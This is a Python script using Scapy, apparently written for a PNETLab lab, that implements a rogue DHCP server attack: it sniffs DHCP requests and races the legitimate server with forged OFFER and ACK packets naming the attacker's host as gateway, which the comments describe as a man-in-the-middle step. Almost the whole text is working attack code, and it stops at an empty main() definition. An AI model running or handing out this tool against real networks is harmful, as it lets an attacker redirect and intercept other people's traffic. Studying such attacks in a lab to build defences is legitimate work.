#!/usr/bin/env python3
"""
=============================================================
  ATAQUE DHCP Spoofing (Rogue DHCP Server) - FAST RACE MODE
  Protocolo: DHCP / BOOTP
  Herramienta: Scapy
  Entorno: PNETLab (VLAN 10 Segmento Seguro)
=============================================================
  Técnicas para ganar la carrera al servidor legítimo:
    1. Threading: la respuesta se envía en un hilo paralelo
       para no bloquear el sniff mientras se procesa.
    2. Ráfaga triple: cada OFFER/ACK se envía 3 veces
       seguidas con mínimo retardo — el cliente acepta el
       primero que llega, la repetición cubre pérdidas.
    3. Socket L2 persistente: se abre una sola vez y se
       reutiliza (evita el overhead de abrir/cerrar socket
       en cada envío que hace sendp internamente).
    4. Construcción anticipada: el paquete se arma ANTES
       de que termine el sniff callback.
=============================================================
"""

from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sniff, get_if_hwaddr, conf
)
import threading
import sys
import time

# ──────────────────────────────────────────────
#  CONFIGURACIÓN
# ──────────────────────────────────────────────
INTERFACE   = "ens4.10"
IP_ATACANTE = "192.168.10.50"
POOL_INICIO = "192.168.10.200"
MASCARA     = "255.255.255.0"
DNS_FALSO   = "8.8.8.8"
LEASE_TIME  = 600

# Cuántas veces repetir cada OFFER/ACK en ráfaga
RAFAGA      = 3
# Retardo entre paquetes de la ráfaga (segundos) — mínimo posible
RETARDO_RAFAGA = 0.001

# ──────────────────────────────────────────────
#  Estado global
# ──────────────────────────────────────────────
pool_lock   = threading.Lock()
pool_actual = list(map(int, POOL_INICIO.split(".")))
stats       = {"offers": 0, "acks": 0}

# Socket L2 persistente — se abre una vez al inicio
_socket = None


def abrir_socket():
    global _socket
    _socket = conf.L2socket(iface=INTERFACE)


def siguiente_ip() -> str:
    """Thread-safe: devuelve la siguiente IP del pool."""
    with pool_lock:
        ip = ".".join(map(str, pool_actual))
        pool_actual[3] += 1
        if pool_actual[3] > 254:
            pool_actual[3] = 200
        return ip


def enviar_rafaga(pkt, veces: int = RAFAGA):
    """
    Envía el mismo paquete `veces` veces consecutivas por el
    socket L2 persistente. Más rápido que sendp() por llamada.
    """
    raw = bytes(pkt)
    for _ in range(veces):
        _socket.send(raw)
        time.sleep(RETARDO_RAFAGA)


def construir_offer(discover) -> tuple:
    ip_cliente  = siguiente_ip()
    mac_cliente = discover[Ether].src

    pkt = (
        Ether(src=get_if_hwaddr(INTERFACE), dst=mac_cliente)
        / IP(src=IP_ATACANTE, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op    = 2,
            yiaddr= ip_cliente,
            siaddr= IP_ATACANTE,
            chaddr= discover[BOOTP].chaddr,
            xid   = discover[BOOTP].xid,
        )
        / DHCP(options=[
            ("message-type", "offer"),
            ("server_id",    IP_ATACANTE),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  MASCARA),
            ("router",       IP_ATACANTE),   # GW falso → MitM
            ("name_server",  DNS_FALSO),
            "end",
        ])
    )
    return pkt, ip_cliente, mac_cliente


def construir_ack(request) -> tuple:
    ip_cliente = None
    for opcion in request[DHCP].options:
        if isinstance(opcion, tuple) and opcion[0] == "requested_addr":
            ip_cliente = opcion[1]
            break
    if not ip_cliente:
        ip_cliente = siguiente_ip()

    mac_cliente = request[Ether].src

    pkt = (
        Ether(src=get_if_hwaddr(INTERFACE), dst=mac_cliente)
        / IP(src=IP_ATACANTE, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op    = 2,
            yiaddr= ip_cliente,
            siaddr= IP_ATACANTE,
            chaddr= request[BOOTP].chaddr,
            xid   = request[BOOTP].xid,
        )
        / DHCP(options=[
            ("message-type", "ack"),
            ("server_id",    IP_ATACANTE),
            ("lease_time",   LEASE_TIME),
            ("subnet_mask",  MASCARA),
            ("router",       IP_ATACANTE),
            ("name_server",  DNS_FALSO),
            "end",
        ])
    )
    return pkt, ip_cliente, mac_cliente


def responder_en_hilo(paquete):
    """
    Se ejecuta en un hilo separado para no bloquear el sniff.
    Construye y envía la respuesta lo antes posible.
    """
    tipo = None
    for opcion in paquete[DHCP].options:
        if isinstance(opcion, tuple) and opcion[0] == "message-type":
            tipo = opcion[1]
            break

    # Normalizar tipo a entero
    if isinstance(tipo, bytes):
        tipo = int.from_bytes(tipo, "big")
    elif isinstance(tipo, str):
        try:
            tipo = int(tipo)
        except ValueError:
            pass

    if tipo == 1 or tipo == "discover":
        pkt, ip, mac = construir_offer(paquete)
        enviar_rafaga(pkt)
        stats["offers"] += 1
        print(f"  [OFFER x{RAFAGA}] → {mac}  IP ofrecida: {ip}  GW: {IP_ATACANTE}")

    elif tipo == 3 or tipo == "request":
        pkt, ip, mac = construir_ack(paquete)
        enviar_rafaga(pkt)
        stats["acks"] += 1
        print(f"  [ACK   x{RAFAGA}] → {mac}  IP asignada: {ip}  GW: {IP_ATACANTE}")


def procesar_dhcp(paquete):
    """
    Callback de sniff: lanza un hilo inmediatamente para
    no añadir latencia entre la captura y la respuesta.
    """
    if not (DHCP in paquete and BOOTP in paquete):
        return
    # Hilo daemon: muere solo si el programa termina
    t = threading.Thread(target=responder_en_hilo, args=(paquete,), daemon=True)
    t.start()


def main():
